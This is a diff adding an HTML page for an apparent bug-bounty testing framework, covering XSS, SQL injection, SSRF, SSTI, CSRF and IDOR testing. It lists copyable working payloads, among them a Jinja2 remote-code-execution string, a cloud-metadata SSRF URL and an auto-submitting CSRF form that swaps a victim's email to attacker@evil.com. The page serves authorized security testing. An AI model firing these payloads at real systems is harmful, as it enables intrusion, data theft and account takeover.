@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phase 3: Interactive Testing - Bug Hunter Framework</title>
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <div class="app-container">
+        <!-- Sidebar Navigation -->
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <div class="logo">BUG HUNTER</div>
+                <div class="logo-subtitle">Security Framework v1.0</div>
+            </div>
+            
+            <nav class="nav-menu">
+                <div class="nav-section">
+                    <div class="nav-section-title">Main</div>
+                    <a href="index.html" class="nav-link">
+                        <span class="nav-icon">◈</span>
+                        <span>Dashboard</span>
+                    </a>
+                </div>
+                
+                <div class="nav-section">
+                    <div class="nav-section-title">Testing Phases</div>
+                    <a href="recon.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 1: Recon</span>
+                    </a>
+                    <a href="baseline.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 2: Baseline</span>
+                    </a>
+                    <a href="testing.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 3: Testing</span>
+                    </a>
+                    <a href="correlation.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 4: Correlation</span>
+                    </a>
+                    <a href="reports.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 5: Reports</span>
+                    </a>
+                </div>
+                
+                <div class="nav-section">
+                    <div class="nav-section-title">System</div>
+                    <a href="settings.html" class="nav-link">
+                        <span class="nav-icon">⚙</span>
+                        <span>Settings</span>
+                    </a>
+                </div>
+            </nav>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Top Header -->
+            <header class="top-header">
+                <div class="breadcrumb">
+                    <a href="index.html" class="breadcrumb-item">Home</a>
+                    <span class="breadcrumb-separator">/</span>
+                    <span class="breadcrumb-item">Phase 3: Interactive Testing</span>
+                </div>
+                
+                <div class="header-actions">
+                    <div class="status-indicator">
+                        <span class="status-dot"></span>
+                        <span>Testing Active</span>
+                    </div>
+                </div>
+            </header>
+
+            <!-- Page Content -->
+            <div class="content-container">
+                <!-- Page Header -->
+                <div class="page-header">
+                    <h1 class="page-title">⚔ Phase 3: Interactive Vulnerability Testing</h1>
+                    <p class="page-subtitle">Decision-tree guided security testing with real-time feedback</p>
+                </div>
+
+                <!-- Vulnerability Type Tabs -->
+                <div class="tabs">
+                    <button class="tab active" data-tab="xss-content">XSS Testing</button>
+                    <button class="tab" data-tab="sqli-content">SQL Injection</button>
+                    <button class="tab" data-tab="ssrf-content">SSRF Testing</button>
+                    <button class="tab" data-tab="ssti-content">SSTI Testing</button>
+                    <button class="tab" data-tab="csrf-content">CSRF Testing</button>
+                    <button class="tab" data-tab="idor-content">IDOR Testing</button>
+                </div>
+
+                <!-- XSS Testing Content -->
+                <div id="xss-content" class="tab-content active">
+                    <div class="card glow-green">
+                        <div class="card-header">
+                            <h2 class="card-title">🔥 Cross-Site Scripting (XSS) Testing</h2>
+                            <span class="badge badge-info">DECISION TREE MODE</span>
+                        </div>
+                        <div class="card-body">
+                            <!-- Decision Tree Interface -->
+                            <div class="decision-tree">
+                                <div class="decision-node active">
+                                    <div class="decision-question">Step 1: Where does user input appear in the response?</div>
+                                    <div class="decision-options">
+                                        <button class="decision-btn" onclick="selectXSSContext('html')">HTML Body</button>
+                                        <button class="decision-btn" onclick="selectXSSContext('attribute')">HTML Attribute</button>
+                                        <button class="decision-btn" onclick="selectXSSContext('script')">JavaScript Context</button>
+                                        <button class="decision-btn" onclick="selectXSSContext('url')">URL/Href</button>
+                                        <button class="decision-btn" onclick="selectXSSContext('css')">CSS Context</button>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div id="xssPayloads" class="hidden">
+                                <h3 style="color: var(--neon-green); margin: 2rem 0 1rem;">Recommended Payloads:</h3>
+                                
+                                <div class="mb-3">
+                                    <div class="flex-between mb-2">
+                                        <strong>Payload 1: Basic Alert</strong>
+                                        <button class="btn btn-secondary" onclick="copyPayload('xss1')">Copy</button>
+                                    </div>
+                                    <div class="code-block" id="xss1">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+                                </div>
+
+                                <div class="mb-3">
+                                    <div class="flex-between mb-2">
+                                        <strong>Payload 2: Event Handler</strong>
+                                        <button class="btn btn-secondary" onclick="copyPayload('xss2')">Copy</button>
+                                    </div>
+                                    <div class="code-block" id="xss2">&lt;img src=x onerror=alert('XSS')&gt;</div>
+                                </div>
+
+                                <div class="mb-3">
+                                    <div class="flex-between mb-2">
+                                        <strong>Payload 3: Polyglot</strong>
+                                        <button class="btn btn-secondary" onclick="copyPayload('xss3')">Copy</button>
+                                    </div>
+                                    <div class="code-block" id="xss3">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('XSS')//&gt;\x3e</div>
+                                </div>
+
+                                <div class="form-group mt-3">
+                                    <label class="form-label">Test Endpoint URL</label>
+                                    <input type="text" class="form-input" placeholder="https://example.com/search?q=" id="xssEndpoint">
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label class="form-label">Parameter Name</label>
+                                    <input type="text" class="form-input" placeholder="q" id="xssParameter" value="q">
+                                </div>
+
+                                <button class="btn btn-primary" onclick="executeXSSTest()">
+                                    <span>🚀</span>
+                                    <span>Execute XSS Test</span>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Test Results -->
+                    <div class="card">
+                        <div class="card-header">
+                            <h2 class="card-title">📊 XSS Test Results</h2>
+                            <button class="btn btn-secondary" onclick="BugHunter.clearTerminal('xssResults')">Clear</button>
+                        </div>
+                        <div class="card-body">
+                            <div class="terminal" id="xssResults">
+                                <div class="terminal-line">Waiting for test execution...</div>
+                                <div class="terminal-line"><span class="terminal-prompt">█</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- SQL Injection Content -->
+                <div id="sqli-content" class="tab-content">
+                    <div class="card glow-green">
+                        <div class="card-header">
+                            <h2 class="card-title">💉 SQL Injection Testing</h2>
+                            <span class="badge badge-info">DECISION TREE MODE</span>
+                        </div>
+                        <div class="card-body">
+                            <div class="decision-tree">
+                                <div class="decision-node active">
+                                    <div class="decision-question">Step 1: What type of SQL injection are you testing?</div>
+                                    <div class="decision-options">
+                                        <button class="decision-btn" onclick="selectSQLType('error')">Error-Based</button>
+                                        <button class="decision-btn" onclick="selectSQLType('blind')">Blind Boolean</button>
+                                        <button class="decision-btn" onclick="selectSQLType('time')">Time-Based</button>
+                                        <button class="decision-btn" onclick="selectSQLType('union')">UNION-Based</button>
+                                        <button class="decision-btn" onclick="selectSQLType('stacked')">Stacked Queries</button>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div id="sqliPayloads" class="hidden">
+                                <h3 style="color: var(--neon-green); margin: 2rem 0 1rem;">SQL Injection Payloads:</h3>
+                                
+                                <div class="mb-3">
+                                    <div class="flex-between mb-2">
+                                        <strong>Detection Payload</strong>
+                                        <button class="btn btn-secondary" onclick="copyPayload('sqli1')">Copy</button>
+                                    </div>
+                                    <div class="code-block" id="sqli1">' OR '1'='1</div>
+                                </div>
+
+                                <div class="mb-3">
+                                    <div class="flex-between mb-2">
+                                        <strong>Error-Based Extraction</strong>
+                                        <button class="btn btn-secondary" onclick="copyPayload('sqli2')">Copy</button>
+                                    </div>
+                                    <div class="code-block" id="sqli2">' AND 1=CONVERT(int, (SELECT @@version))--</div>
+                                </div>
+
+                                <div class="mb-3">
+                                    <div class="flex-between mb-2">
+                                        <strong>UNION-Based Enumeration</strong>
+                                        <button class="btn btn-secondary" onclick="copyPayload('sqli3')">Copy</button>
+                                    </div>
+                                    <div class="code-block" id="sqli3">' UNION SELECT NULL,NULL,NULL,@@version,NULL--</div>
+                                </div>
+
+                                <div class="mb-3">
+                                    <div class="flex-between mb-2">
+                                        <strong>Time-Based Blind</strong>
+                                        <button class="btn btn-secondary" onclick="copyPayload('sqli4')">Copy</button>
+                                    </div>
+                                    <div class="code-block" id="sqli4">' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--</div>
+                                </div>
+
+                                <div class="alert alert-warning">
+                                    <span class="alert-icon">⚠</span>
+                                    <div>
+                                        <strong>Baseline Reference:</strong> Normal response time is 247ms. 
+                                        Time-based attacks should trigger delays >500ms to confirm vulnerability.
+                                    </div>
+                                </div>
+
+                                <div class="form-group mt-3">
+                                    <label class="form-label">Vulnerable Parameter URL</label>
+                                    <input type="text" class="form-input" placeholder="https://example.com/user?id=" id="sqliEndpoint">
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label class="form-label">Parameter Name</label>
+                                    <input type="text" class="form-input" placeholder="id" id="sqliParameter" value="id">
+                                </div>
+
+                                <button class="btn btn-primary" onclick="executeSQLTest()">
+                                    <span>🚀</span>
+                                    <span>Execute SQL Injection Test</span>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <h2 class="card-title">📊 SQL Injection Results</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="terminal" id="sqliResults">
+                                <div class="terminal-line">Waiting for test execution...</div>
+                                <div class="terminal-line"><span class="terminal-prompt">█</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- SSRF Content -->
+                <div id="ssrf-content" class="tab-content">
+                    <div class="card glow-green">
+                        <div class="card-header">
+                            <h2 class="card-title">🌐 Server-Side Request Forgery (SSRF) Testing</h2>
+                        </div>
+                        <div class="card-body">
+                            <h3 style="color: var(--neon-green); margin-bottom: 1rem;">SSRF Test Payloads:</h3>
+                            
+                            <div class="mb-3">
+                                <div class="flex-between mb-2">
+                                    <strong>Internal Network Probe</strong>
+                                    <button class="btn btn-secondary" onclick="copyPayload('ssrf1')">Copy</button>
+                                </div>
+                                <div class="code-block" id="ssrf1">http://127.0.0.1:80</div>
+                            </div>
+
+                            <div class="mb-3">
+                                <div class="flex-between mb-2">
+                                    <strong>Cloud Metadata</strong>
+                                    <button class="btn btn-secondary" onclick="copyPayload('ssrf2')">Copy</button>
+                                </div>
+                                <div class="code-block" id="ssrf2">http://169.254.169.254/latest/meta-data/</div>
+                            </div>
+
+                            <div class="mb-3">
+                                <div class="flex-between mb-2">
+                                    <strong>DNS Rebinding Bypass</strong>
+                                    <button class="btn btn-secondary" onclick="copyPayload('ssrf3')">Copy</button>
+                                </div>
+                                <div class="code-block" id="ssrf3">http://localtest.me</div>
+                            </div>
+
+                            <div class="form-group">
+                                <label class="form-label">URL Parameter to Test</label>
+                                <input type="text" class="form-input" placeholder="https://example.com/fetch?url=" id="ssrfEndpoint">
+                            </div>
+
+                            <button class="btn btn-primary">
+                                <span>🚀</span>
+                                <span>Execute SSRF Test</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- SSTI Content -->
+                <div id="ssti-content" class="tab-content">
+                    <div class="card glow-green">
+                        <div class="card-header">
+                            <h2 class="card-title">📄 Server-Side Template Injection (SSTI) Testing</h2>
+                        </div>
+                        <div class="card-body">
+                            <h3 style="color: var(--neon-green); margin-bottom: 1rem;">SSTI Detection & Exploitation:</h3>
+                            
+                            <div class="mb-3">
+                                <div class="flex-between mb-2">
+                                    <strong>Detection - Math Expression</strong>
+                                    <button class="btn btn-secondary" onclick="copyPayload('ssti1')">Copy</button>
+                                </div>
+                                <div class="code-block" id="ssti1">{{7*7}}</div>
+                                <div class="text-secondary mt-1">Expected output if vulnerable: 49</div>
+                            </div>
+
+                            <div class="mb-3">
+                                <div class="flex-between mb-2">
+                                    <strong>Jinja2 RCE</strong>
+                                    <button class="btn btn-secondary" onclick="copyPayload('ssti2')">Copy</button>
+                                </div>
+                                <div class="code-block" id="ssti2">{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</div>
+                            </div>
+
+                            <div class="mb-3">
+                                <div class="flex-between mb-2">
+                                    <strong>Node.js (Pug/Jade) RCE</strong>
+                                    <button class="btn btn-secondary" onclick="copyPayload('ssti3')">Copy</button>
+                                </div>
+                                <div class="code-block" id="ssti3">${7*7}</div>
+                            </div>
+
+                            <div class="alert alert-danger">
+                                <span class="alert-icon">⚠</span>
+                                <div>
+                                    <strong>CRITICAL:</strong> Baseline analysis detected template engine errors. 
+                                    SSTI could lead to Remote Code Execution. Test with extreme caution.
+                                </div>
+                            </div>
+
+                            <button class="btn btn-primary">
+                                <span>🚀</span>
+                                <span>Execute SSTI Test</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- CSRF Content -->
+                <div id="csrf-content" class="tab-content">
+                    <div class="card glow-green">
+                        <div class="card-header">
+                            <h2 class="card-title">🔐 Cross-Site Request Forgery (CSRF) Testing</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="alert alert-warning mb-3">
+                                <span class="alert-icon">⚠</span>
+                                <div>
+                                    <strong>Baseline Finding:</strong> Session cookies lack SameSite attribute. 
+                                    Application may be vulnerable to CSRF attacks.
+                                </div>
+                            </div>
+
+                            <h3 style="color: var(--neon-green); margin-bottom: 1rem;">CSRF Test Steps:</h3>
+                            
+                            <div class="mb-3">
+                                <strong>1. Proof of Concept HTML:</strong>
+                                <div class="code-block mt-2">
+&lt;form action="https://example.com/api/update-email" method="POST"&gt;
+  &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+  &lt;input type="submit" value="Click Me"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+                                </div>
+                            </div>
+
+                            <div class="mb-3">
+                                <strong>2. Test for Token Validation:</strong>
+                                <div class="code-block mt-2">
+# Remove or modify CSRF token
+# Check if request still succeeds
+                                </div>
+                            </div>
+
+                            <button class="btn btn-primary">
+                                <span>🚀</span>
+                                <span>Generate CSRF PoC</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- IDOR Content -->
+                <div id="idor-content" class="tab-content">
+                    <div class="card glow-green">
+                        <div class="card-header">
+                            <h2 class="card-title">🔑 Insecure Direct Object Reference (IDOR) Testing</h2>
+                        </div>
+                        <div class="card-body">
+                            <h3 style="color: var(--neon-green); margin-bottom: 1rem;">IDOR Testing Methodology:</h3>
+                            
+                            <div class="mb-3">
+                                <strong>Step 1: Identify Object References</strong>
+                                <div class="text-secondary mt-1">
+                                    Look for numeric IDs, UUIDs, or predictable patterns in URLs and API calls:
+                                </div>
+                                <div class="code-block mt-2">
+/api/user/123/profile
+/documents/download?id=456
+/invoice/view/789
+                                </div>
+                            </div>
+
+                            <div class="mb-3">
+                                <strong>Step 2: Test Authorization</strong>
+                                <div class="text-secondary mt-1">
+                                    Modify object references to access other users' resources:
+                                </div>
+                                <div class="code-block mt-2">
+# Your user ID: 123
+# Try: /api/user/124/profile
+# Try: /api/user/1/profile (admin?)
+                                </div>
+                            </div>
+
+                            <div class="form-group">
+                                <label class="form-label">Endpoint with Object Reference</label>
+                                <input type="text" class="form-input" placeholder="https://example.com/api/user/123/data">
+                            </div>
+
+                            <button class="btn btn-primary">
+                                <span>🚀</span>
+                                <span>Execute IDOR Test</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Evidence Collection -->
+                <div class="card">
+                    <div class="card-header">
+                        <h2 class="card-title">📸 Evidence Collection</h2>
+                    </div>
+                    <div class="card-body">
+                        <div class="form-group">
+                            <label class="form-label">Vulnerability Title</label>
+                            <input type="text" class="form-input" placeholder="e.g., Reflected XSS in search parameter">
+                        </div>
+                        
+                        <div class="grid grid-2">
+                            <div class="form-group">
+                                <label class="form-label">Severity</label>
+                                <select class="form-select">
+                                    <option>Critical</option>
+                                    <option>High</option>
+                                    <option>Medium</option>
+                                    <option>Low</option>
+                                    <option>Informational</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">Confidence</label>
+                                <select class="form-select">
+                                    <option>Confirmed</option>
+                                    <option>Firm</option>
+                                    <option>Tentative</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">Request/Response Evidence</label>
+                            <textarea class="form-textarea" placeholder="Paste HTTP request and response showing the vulnerability..."></textarea>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">Exploitation Notes</label>
+                            <textarea class="form-textarea" placeholder="Describe how the vulnerability was discovered and exploited..."></textarea>
+                        </div>
+
+                        <button class="btn btn-primary">
+                            <span>💾</span>
+                            <span>Save Finding</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Actions -->
+                <div class="card">
+                    <div class="card-body flex gap-2">
+                        <a href="correlation.html" class="btn btn-primary">
+                            <span>➜</span>
+                            <span>Proceed to Phase 4: Correlation</span>
+                        </a>
+                        <button class="btn btn-secondary">
+                            <span>📊</span>
+                            <span>View All Findings</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script src="../js/app.js"></script>
+    <script>
+        function selectXSSContext(context) {
+            document.getElementById('xssPayloads').classList.remove('hidden');
+            BugHunter.addTerminalLine('xssResults', `[INFO] Selected context: ${context.toUpperCase()}`, 'info');
+            BugHunter.addTerminalLine('xssResults', '[INFO] Payloads generated based on context', 'success');
+        }
+
+        function selectSQLType(type) {
+            document.getElementById('sqliPayloads').classList.remove('hidden');
+            BugHunter.addTerminalLine('sqliResults', `[INFO] Selected SQL injection type: ${type.toUpperCase()}`, 'info');
+        }
+
+        function copyPayload(id) {
+            const element = document.getElementById(id);
+            navigator.clipboard.writeText(element.textContent);
+            BugHunter.showNotification('Payload copied to clipboard', 'success');
+        }
+
+        async function executeXSSTest() {
+            const endpoint = document.getElementById('xssEndpoint').value;
+            const parameter = document.getElementById('xssParameter')?.value || 'q';
+            
+            if (!endpoint) {
+                BugHunter.showNotification('Please enter a test endpoint URL', 'error');
+                return;
+            }
+            
+            BugHunter.clearTerminal('xssResults');
+            BugHunter.addTerminalLine('xssResults', `[START] Initiating XSS test on ${endpoint}`, 'info');
+            BugHunter.addTerminalLine('xssResults', `[INFO] Testing parameter: ${parameter}`, 'info');
+            
+            try {
+                // Generate a unique target ID
+                const targetId = 'test-' + Date.now();
+                
+                // Call the XSS testing API
+                BugHunter.addTerminalLine('xssResults', '[STEP 1/3] Calling XSS testing API...', 'info');
+                const result = await BugHunter.testXSS(targetId, endpoint, parameter, 'html');
+                
+                BugHunter.addTerminalLine('xssResults', '[STEP 2/3] Analyzing response...', 'info');
+                
+                // Display results
+                if (result.steps && result.steps.length > 0) {
+                    result.steps.forEach((step, index) => {
+                        const logType = step.result.includes('✓') ? 'success' : 
+                                       step.result.includes('✗') ? 'error' : 'info';
+                        BugHunter.addTerminalLine('xssResults', 
+                            `[STEP ${index + 1}] ${step.description}: ${step.result}`, 
+                            logType);
+                    });
+                }
+                
+                BugHunter.addTerminalLine('xssResults', '[STEP 3/3] Test complete', 'info');
+                
+                if (result.vulnerability_found) {
+                    BugHunter.addTerminalLine('xssResults', 
+                        `[✓] VULNERABILITY CONFIRMED: XSS detected! (Confidence: ${result.confidence})`, 
+                        'success');
+                    BugHunter.showNotification('XSS vulnerability found!', 'success');
+                } else {
+                    BugHunter.addTerminalLine('xssResults', 
+                        '[✗] No XSS vulnerability detected', 
+                        'warning');
+                    BugHunter.showNotification('No vulnerability found', 'info');
+                }
+                
+            } catch (error) {
+                BugHunter.addTerminalLine('xssResults', `[ERROR] ${error.message}`, 'error');
+                BugHunter.showNotification('XSS test failed: ' + error.message, 'error');
+                console.error('XSS test error:', error);
+            }
+        }
+
+        async function executeSQLTest() {
+            const endpoint = document.getElementById('sqliEndpoint').value;
+            const parameter = document.getElementById('sqliParameter')?.value || 'id';
+            
+            if (!endpoint) {
+                BugHunter.showNotification('Please enter a test endpoint URL', 'error');
+                return;
+            }
+            
+            BugHunter.clearTerminal('sqliResults');
+            BugHunter.addTerminalLine('sqliResults', `[START] Testing SQL injection on ${endpoint}`, 'info');
+            BugHunter.addTerminalLine('sqliResults', `[INFO] Testing parameter: ${parameter}`, 'info');
+            
+            try {
+                // Generate a unique target ID
+                const targetId = 'test-' + Date.now();
+                
+                // Call the SQLi testing API
+                BugHunter.addTerminalLine('sqliResults', '[STEP 1/3] Calling SQLi testing API...', 'info');
+                const result = await BugHunter.testSQLi(targetId, endpoint, parameter);
+                
+                BugHunter.addTerminalLine('sqliResults', '[STEP 2/3] Analyzing response...', 'info');
+                
+                // Display results
+                if (result.steps && result.steps.length > 0) {
+                    result.steps.forEach((step, index) => {
+                        const logType = step.result.includes('✓') ? 'success' : 
+                                       step.result.includes('✗') ? 'error' : 'info';
+                        BugHunter.addTerminalLine('sqliResults', 
+                            `[STEP ${index + 1}] ${step.description}: ${step.result}`, 
+                            logType);
+                    });
+                }
+                
+                BugHunter.addTerminalLine('sqliResults', '[STEP 3/3] Test complete', 'info');
+                
+                if (result.vulnerability_found) {
+                    BugHunter.addTerminalLine('sqliResults', 
+                        `[✓] VULNERABILITY CONFIRMED: SQL Injection detected! (Confidence: ${result.confidence})`, 
+                        'success');
+                    BugHunter.showNotification('SQL Injection vulnerability found!', 'success');
+                } else {
+                    BugHunter.addTerminalLine('sqliResults', 
+                        '[✗] No SQL injection vulnerability detected', 
+                        'warning');
+                    BugHunter.showNotification('No vulnerability found', 'info');
+                }
+                
+            } catch (error) {
+                BugHunter.addTerminalLine('sqliResults', `[ERROR] ${error.message}`, 'error');
+                BugHunter.showNotification('SQLi test failed: ' + error.message, 'error');
+                console.error('SQLi test error:', error);
+            }
+        }
+    </script>
+</body>
+</html>
